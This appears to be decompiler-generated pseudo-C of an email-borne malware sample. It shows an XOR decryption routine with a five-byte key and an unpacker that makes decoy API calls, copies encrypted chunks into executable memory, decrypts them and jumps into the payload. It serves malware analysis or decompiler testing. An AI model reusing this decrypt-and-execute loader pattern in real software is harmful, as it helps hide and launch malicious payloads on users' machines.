// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0909/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn13101000(Eq_76 * dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc08_25 = (word16) (SEQ(0x00000000, dwArg14) % 0x00000005);
	Eq_14 * dwArg08_30 = dwArg08 + dwArg14;
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		dwArg04->b0000 = (byte) ((int32) dwArg08_30->b0000 ^ (word32) ((int32) wLoc08_25)[dwArg18]);
		word16 ax_79 = wLoc08_25 + 0x0001;
		wLoc08_25 = ax_79;
		if ((int32) ax_79 == 0x00000005)
			wLoc08_25 = 0x0000;
		dwArg04 = dwArg04 + 1;
		dwArg08_30 = dwArg08_30 + 1;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return;
}

void fn1310109B()
{
	AddAccessDeniedAce(0x02800000, 0x04A00000, 0x00002600, 0x00000000);
	ADVAPI32.dll!BuildExplicitAccessWithNameA();
	KERNEL32.dll!BaseInitAppcompatCacheSupport();
	Eq_60 * eax_25 = SafeArrayGetUBound(null, 0x028C0000, (LONG *) 0x00000900);
	word32 eax_49 = eax_25->dw930A1FA9;
	fn13101000(fp + 0xFFFFFDC4, fp + 0xFFFFFDC4, 0x00000004, fp - 0x00000010, 0x00000000, fp + 0xFFFFFDCC);
	SetErrorMode(0x00000BC0);
	KERNEL32.dll!BaseInitAppcompatCacheSupport();
	word32 ecx_78 = eax_25->dw930A1FAD;
	fn13101000(fp + 0xFFFFFDA8, fp + 0xFFFFFDA4, 0x00000004, fp - 0x00000010, 0x00000004, fp + 0xFFFFFDCC);
	KERNEL32.dll!BaseDumpAppcompatCache();
	ui32 ecx_101 = eax_25->dw930A1FB1;
	fn13101000(fp - 0x00000014, fp - 0x0000001C, 0x00000004, fp - 0x00000010, 0x00000008, fp + 0xFFFFFDCC);
	word32 eax_127 = GetModuleHandleA(0x00000000);
	AdjustTokenGroups(0x00000000, 0x00000000, 0x00004400, 0x80000000, 0x78000000, 0x00000000);
	ADVAPI32.dll!ControlTraceA();
	ADVAPI32.dll!BuildTrusteeWithObjectsAndNameA();
	word32 ebx_173 = eax_25->dw930A1FB5;
	fn13101000(fp - 0x0000001C, fp - 0x00000028, 0x00000004, fp - 0x00000010, 0x0000000C, fp + 0xFFFFFDCC);
	word32 dwLoc2388_206 = eax_25->dw930A1FB9;
	fn13101000(fp + 0xFFFFDC78, fp + 0xFFFFDC68, 0x00000004, fp - 0x00000010, 0x00000010, fp + 0xFFFFFDCC);
	word32 ebx_234 = ecx_101 * 0x00000008 + 0x0000000C;
	word32 dwLoc2390_229 = 0x00000014;
	Eq_195 * dwLoc24_232 = &eax_25->t930A1FBD;
	Eq_76 * eax_247 = VirtualAlloc(0x00000000, ebx_234 + ecx_78 + eax_49, 0x00003000, 0x00000040);
	Eq_211 * dwLoc0C_253 = ebx_173 + eax_127 + ebx_234;
	word32 dwLoc0264_257 = ebx_234;
	ui32 dwLoc08_258 = 0x00000000;
	word32 dwLoc18_259 = 0x00000000;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0264_257 == dwLoc2388_206)
		{
			ui32 eax_381 = dwLoc08_258 + 0x00000001;
			dwLoc08_258 = eax_381;
			if (eax_381 == ecx_101)
				goto l13101497;
			word32 ecx_387 = dwLoc24_232->dw0000;
			fn13101000(fp - 0x0000001C, fp - 0x0000001C - dwLoc2390_229, 0x00000004, fp - 0x00000010, dwLoc2390_229, fp + 0xFFFFFDCC);
			Eq_260 * ebx_416 = &dwLoc24_232->t0004;
			word32 ebx_413 = dwLoc2390_229 + 0x00000004;
			dwLoc2388_206 = ebx_416->dw0000;
			fn13101000(fp + 0xFFFFDC78, fp + 0xFFFFDC78 - ebx_413, 0x00000004, fp - 0x00000010, ebx_413, fp + 0xFFFFFDCC);
			dwLoc2390_229 = ebx_413 + 0x00000004;
			dwLoc24_232 = ebx_416 + 0x00000004;
			dwLoc0264_257 = 0x00000000;
			dwLoc0C_253 = ecx_387 + eax_127;
			goto l13101452;
		}
l13101452:
		eax_247->b0000 = dwLoc0C_253->b0000;
		dwLoc0C_253 = dwLoc0C_253 + 1;
		dwLoc18_259 = dwLoc18_259 + 0x00000001;
		dwLoc0264_257 = dwLoc0264_257 + 0x00000001;
	}
l13101497:
	fn13101000(eax_247, eax_247 - ebx_234, ecx_78, fp + 0xFFFFFDC8, ebx_234, fp + 0xFFFFFDCC);
	(eax_247 + 0x00000F50)();
	return;
}

